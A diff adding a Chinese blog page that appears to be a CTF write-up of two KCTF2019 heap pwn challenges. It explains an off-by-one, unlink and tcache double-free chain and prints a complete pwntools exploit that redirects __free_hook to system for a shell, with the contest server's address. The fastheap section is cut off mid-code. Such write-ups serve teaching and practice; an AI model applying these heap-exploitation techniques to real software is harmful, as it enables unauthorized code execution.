@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="临时被拉去了看雪CTF，做出了两道pwn题目，记录一下。">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="KCTF2019 Q2部分pwn题">
+<meta property="og:url" content="http://x3h1n.github.io/2019/06/23/KCTF2019-Q2部分pwn题/index.html">
+<meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="临时被拉去了看雪CTF，做出了两道pwn题目，记录一下。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://x3h1n.github.io/2019/06/23/KCTF2019-Q2部分pwn题/1.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/06/23/KCTF2019-Q2部分pwn题/2.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/06/23/KCTF2019-Q2部分pwn题/3.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/06/23/KCTF2019-Q2部分pwn题/4.png">
+<meta property="og:updated_time" content="2019-06-24T07:26:52.801Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="KCTF2019 Q2部分pwn题">
+<meta name="twitter:description" content="临时被拉去了看雪CTF，做出了两道pwn题目，记录一下。">
+<meta name="twitter:image" content="http://x3h1n.github.io/2019/06/23/KCTF2019-Q2部分pwn题/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://x3h1n.github.io/2019/06/23/KCTF2019-Q2部分pwn题/"/>
+
+
+
+
+
+  <title>KCTF2019 Q2部分pwn题 | X3h1n</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">X3h1n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/06/23/KCTF2019-Q2部分pwn题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="X3h1n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">KCTF2019 Q2部分pwn题</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-23T20:21:47+08:00">
+                2019-06-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>临时被拉去了看雪CTF，做出了两道pwn题目，记录一下。<br><a id="more"></a></p>
+<h1 id="沉睡的敦煌–pwn"><a href="#沉睡的敦煌–pwn" class="headerlink" title="沉睡的敦煌–pwn"></a>沉睡的敦煌–pwn</h1><p>做的时候有点坑啊，最初这道题目的edit次数最多为2次，做出来了之后远程一直打不通，后来才知道出题人又改成了1次。</p>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>这道题目有4个功能，malloc、free、edit和show。libc是2.27，有tcache。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.malloc"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.free"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.edit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.show"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>题目限制还挺多的，首先malloc功能中最多申请31个块，题目开始申请了一个0x30的块，后续堆块的申请地址范围必须在该堆块+0x800的范围内，这意味着后续想要分配到malloc_hook-0x23处时需要修改bss段上存储这个堆地址的地方。<br>edit功能里仅允许edit一次，其实只要edit_num不为1就可以，可以利用仅仅一次的edit想办法将edit_num改大。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( edit_num == <span class="number">1</span> ) <span class="comment">//here</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">  idx = my_atoi();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> || !heap_list[idx] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">  v0 = heap_list[idx];</span><br><span class="line">  read(<span class="number">0</span>, heap_list[idx], <span class="number">0x28</span>uLL);</span><br><span class="line">  ++edit_num;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>show功能里show_flag开始为0，当它非0时才能进行show。地址泄露瘴气氨也要把它改大。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( show_flag ) <span class="comment">//here</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">    v1 = my_atoi();</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">31</span> || !heap_list[v1] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)heap_list[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"only admin can use"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="题目漏洞-amp-利用过程"><a href="#题目漏洞-amp-利用过程" class="headerlink" title="题目漏洞 &amp; 利用过程"></a>题目漏洞 &amp; 利用过程</h2><p>在add函数里，堆块的大小限制在0x28，但是在输入content时多读了一个字节，有off-by-one的漏洞。有off-by-one加tcache就可以double free了。<br>每次分配后会print分配的堆地址，堆地址就知道了。<br>因为我们需要泄露地址，肯定要把show_flag改掉，地址为0x00404188；edit功能只有一次，限制太多，也要改掉，地址为0x0040418C；如果要劫持fastbin，那么每次分配堆的地址检查也要改掉才行，地址为0x00404060。这里利用思路想到了unlink，因此的确bss段上有分配的堆地址，可以通过unlink的检查：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br></pre></td></tr></table></figure></p>
+<p>这里离show_flag和edit_num最近的我们可控的地址就是chunk idx31，bss段上存储该堆块地址的是0x00404178。unlink可以将该地址改为0x00404178-0x18=0x00404160。由于堆块大小为0x30，edit的区域只有0x28，0x00404160+0x28=0x00404188，正好不能修改show_flag和edit_num。但是可以利用off-by-one再次进行unlink，将存储堆地址限制的地方0x00404060修改为0x00404060-0x18=0x00404048。从而劫持队到bss段上。因此利用思路如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.在0x00404178对应的堆块处进行unlink，将0x00404178修改为0x00404160。</span><br><span class="line">2.在0x00404060处对应的堆块处进行unlink，将0x00404060修改为0x00404048。</span><br><span class="line">3.利用仅有一次的edit功能在0x00404160处伪造堆块，并释放至tcache（提前做好tcache 0x30的填充，因为double free一次后tcache</span><br><span class="line">数量变成了-1,也就是255,再释放直接进入fastbin，可以提前释放几个块，只要不让它的数量减为-1就可以）。</span><br><span class="line">4.申请bss段上伪造的堆块，并进行show_flag和edit_num的修改。</span><br><span class="line">5.利用show功能泄露libc。</span><br><span class="line">6.double free将free_hook修改为system函数地址</span><br><span class="line">7.释放一个&quot;/bin/sh\x00&quot;的堆块，get shell。</span><br></pre></td></tr></table></figure></p>
+<p>完整的exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.update(arch='amd64',os='linux',log_level="DEBUG")</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">"-h"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:\n"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"gift: "</span>)</span><br><span class="line">    heap_ptr = int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    <span class="keyword">return</span> heap_ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:\n"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:\n"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"content:\n"</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:\n"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"152.136.18.34"</span>,<span class="number">10001</span>)</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##0~13</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">14</span>,<span class="number">2</span>):</span><br><span class="line">    add(i,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">    delete(i)</span><br><span class="line">    add(i,<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'\x91'</span>)</span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>,<span class="string">'0000'</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="string">'1111'</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="string">'2222'</span>)</span><br><span class="line">add(<span class="number">17</span>,<span class="string">'3333'</span>)</span><br><span class="line">add(<span class="number">18</span>,<span class="string">"4444"</span>)</span><br><span class="line">add(<span class="number">19</span>,p64(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">20</span>,<span class="string">"6666"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##unlink</span></span><br><span class="line">delete(<span class="number">16</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0x404178</span><span class="number">-0x18</span>)+p64(<span class="number">0x404178</span><span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + <span class="string">'\x90'</span></span><br><span class="line">heap_ptr = add(<span class="number">31</span>,payload)</span><br><span class="line"><span class="keyword">print</span> hex(heap_ptr)</span><br><span class="line">heap_base = heap_ptr - <span class="number">0x5a0</span></span><br><span class="line">delete(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##double free</span></span><br><span class="line">add(<span class="number">17</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">21</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">22</span>,<span class="string">'\n'</span>) <span class="comment">#22==18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##fill tcache</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">22</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">18</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x260</span>))</span><br><span class="line">add(<span class="number">22</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unlink</span></span><br><span class="line">add(<span class="number">23</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x404060</span><span class="number">-0x18</span>)+p64(<span class="number">0x404060</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">add(<span class="number">14</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x300</span>)+<span class="string">'\x90'</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##edit edit_num and show_flag</span></span><br><span class="line">edit(<span class="number">31</span>,p64(<span class="number">0x404060</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x404170</span>))</span><br><span class="line">delete(<span class="number">31</span>)</span><br><span class="line">add(<span class="number">31</span>,p64(<span class="number">0x404180</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">delete(<span class="number">30</span>)</span><br><span class="line">add(<span class="number">30</span>,p64(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##leak libc</span></span><br><span class="line">edit(<span class="number">28</span>,p64(<span class="number">0x404048</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_base+<span class="number">0x640</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">"__malloc_hook"</span>] - <span class="number">0x70</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak_addr:"</span>,hex(leak_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">"__free_hook"</span>] + libc_base</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">##double free</span></span><br><span class="line">delete(<span class="number">22</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">edit(<span class="number">28</span>,p64(heap_base+<span class="number">0x250</span>))</span><br><span class="line">add(<span class="number">18</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">22</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">edit(<span class="number">28</span>,p64(free_hook<span class="number">-0x100</span>))</span><br><span class="line">add(<span class="number">27</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">##trigger</span></span><br><span class="line">delete(<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h1 id="绝地逃生–fastheap"><a href="#绝地逃生–fastheap" class="headerlink" title="绝地逃生–fastheap"></a>绝地逃生–fastheap</h1><p>做出这道题真的是靠的运气。</p>
+<h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>这道题目也是传统的菜单题目，有三个功能，add、fast free和show功能。libc是2.27，有tcache。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./fastheap </span><br><span class="line">1. malloc</span><br><span class="line">2. fast free</span><br><span class="line">3. puts</span><br><span class="line">4. exit</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>其中malloc功能虽然对堆块的数量没有明确的限制，但是因为堆块的索引是unsigned __int8类型，因此堆块的所以范围为0-255，因此最多可以申请256个堆块。size的类型同样也是unsigned __int8类型，因此输入的size最大为0xff，堆块大小最大为0x110。在bss段有一个全局的heap_lis保存堆块的地址。接受用户输入的read函数很严格，没有常见的off-by-one的漏洞。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 idx; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rt1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"Index: "</span>);</span><br><span class="line">  idx = (<span class="keyword">unsigned</span> __int8)my_atoi();</span><br><span class="line">  <span class="keyword">if</span> ( heap_list[idx] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"Size: "</span>);</span><br><span class="line">  size = (<span class="keyword">unsigned</span> __int8)my_atoi();</span><br><span class="line">  heap_list[idx] = check(size);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"Contents: "</span>);</span><br><span 